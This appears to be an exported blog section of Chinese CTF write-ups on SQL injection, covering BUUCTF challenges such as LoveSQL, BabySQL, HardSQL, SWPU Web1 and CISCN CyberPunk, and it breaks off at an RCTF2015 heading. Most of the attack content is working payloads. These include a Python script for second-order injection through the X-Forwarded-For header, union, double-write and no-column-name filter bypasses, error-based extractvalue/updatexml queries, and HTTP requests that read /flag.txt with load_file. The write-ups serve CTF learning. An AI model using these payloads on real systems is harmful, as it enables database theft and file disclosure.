<p>在传入url为找到可疑点，F12查看源码可以看到html页面有注释显示着访问的客户端<code>Ip</code>，推测后端将客户端的<code>Ip</code>地址记录到数据库当中。尝试改写XFF头发现ip可控，推测为XFF头注入，于是尝试sql注入，测试后发现，XFF注入请求一次后，再请求两次正常XFF的ip，即可触发XFF的sql注入，推测后端代码，第二次并未直接从数据库中请求数据，由于第二次请求的ip不一样，服务器会直接将上次的ip显示出来，在第三次请求和第二次一样的ip的时，服务器就会从数据库中查找<code>last ip</code>，即可触发sql注入</p>
<p>exp（glzjin yyds）：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> requests

target <span class="token operator">=</span> <span class="token string">"http://node3.buuoj.cn:27167/"</span>

<span class="token keyword">def</span> <span class="token function">execute_sql</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]请求语句："</span> <span class="token operator">+</span> sql<span class="token punctuation">)</span>
    return_result <span class="token operator">=</span> <span class="token string">""</span>

    payload <span class="token operator">=</span> <span class="token string">"0'|length(("</span> <span class="token operator">+</span> sql <span class="token operator">+</span> <span class="token string">"))|'0"</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    start_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Last Ip: "</span><span class="token punctuation">)</span>
    end_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">" -->"</span><span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span>
    length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">[</span>start_pos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span> end_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]长度："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"0'|conv(hex(substr(("</span> <span class="token operator">+</span> sql <span class="token operator">+</span> <span class="token string">"),"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",5)),16,10)|'0"</span>

        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment"># 将语句注入</span>
        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># 查询上次IP时触发二次注入</span>
        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># 再次查询得到结果</span>
        start_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Last Ip: "</span><span class="token punctuation">)</span>
        end_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">" -->"</span><span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span>
        result <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">[</span>start_pos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span> end_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>
        return_result <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]位置 "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 请求五位成功:"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> return_result


<span class="token comment"># 获取数据库</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]获取成功："</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 获取数据库表</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]获取成功："</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 获取数据库表</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]获取成功："</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 获取表中内容</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]获取成功："</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SQL注入-有回显</title>
    <url>/posts/dede9973/</url>
    <content><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc"><strong>group_concat</strong>()</a></p>
<p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p>
<p>查数据库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>查列：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>最后password对应的表名应该是前面查询表名最后一个</p>
<p>查l0ve1ysq1表最后一列的字段内容：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>最终得到flag</p>
<h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p>
<p>详细见CSDN上大佬的<a href="https://blog.csdn.net/whoim_i/article/details/102869687">文章</a>，另外附上文章的HTML文档</p>
<p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p>
<p>查库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' uniunionon seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span>schemata <span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>查列：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>查字段，反复尝试后发现flag在表b4bsql中的password列</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span> frfromom b4bsql<span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>得到flag</p>
<h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p>
<p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p>
<p>登录后可申请发布广告</p>
<p>广告申请界面：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/CYufWMHk5dvQZXp.png" style="zoom:67%;" loading="lazy">

<p>随便申请一个后首页显示：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/IRm9FwGvXH81ZiT.png" style="zoom:67%;" loading="lazy">

<p>广告详情：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt loading="lazy"></p>
<p>在广告申请界面测试后发现存在SQL注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt loading="lazy"></p>
<p>配合union查询查列数：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>

<p>或</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre>

<blockquote>
<p>注：</p>
<ul>
<li>过滤了–+和#，故闭合最后的单引号</li>
<li>过滤了空格用/**/分离参数</li>
</ul>
</blockquote>
<p>有22列，由广告详情界面显示可知，第2,3列可注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt loading="lazy"></p>
<p>查数据库库，数据库版本</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>

<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>

<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>

<blockquote>
<p>注：</p>
<ul>
<li>此处利用无列名注入</li>
<li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li>
<li>参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">官方文档</a></li>
<li>参考：<a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></li>
<li>参考：<a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></li>
</ul>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt loading="lazy"></p>
<p>查列</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,(select/**/1,2,3/**/union/**/select*from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>

<blockquote>
<p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p>
</blockquote>
<p>列数错误时：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt loading="lazy"></p>
<p>然后再配合无列名注入注出user表中的flag</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt loading="lazy"></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p>
<p>经过测试发现过滤了：空格，=，order by，union，and</p>
<p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p>
<p>查库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#查当前数据库</span></code></pre>

<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#查所有数据库</span></code></pre>

<p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p>
<p>查表（like代替=进行查询）：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'</span>geek'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#查geek数据库下的表</span></code></pre>

<p>查列：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'</span>H4rDsq1'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(left(password,30))from(H4rDsq1))));#查左边

1'</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#查右边</span></code></pre>

<h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><p>直接看关键代码，change.php中：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string double-quoted-string">"', `old_address`='"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' where `user_id`="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"订单修改成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>address</code>并没有过滤黑名单，只使用了一个<code>addslashes</code>函数限制，在update的时候，直接将<code>address</code>取出来将其置为<code>old_address</code>，造成二次注入，并且后面有<code>print_r($db-&gt;error);</code>将报错信息打印出来，于是利用报错注入，payload如下：</p>
<pre class="language-none"><code class="language-none">POST &#x2F;change.php HTTP&#x2F;1.1
Host: 1251682b-93a6-4e1c-af18-c5847f900f36.node3.buuoj.cn

user_name&#x3D;admin&amp;phone&#x3D;111&amp;address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#



POST &#x2F;change.php HTTP&#x2F;1.1
Host: 1251682b-93a6-4e1c-af18-c5847f900f36.node3.buuoj.cn

user_name&#x3D;admin&amp;phone&#x3D;111&amp;address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</code></pre>

<h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>打开题目发现有登录注册两个界面</p>
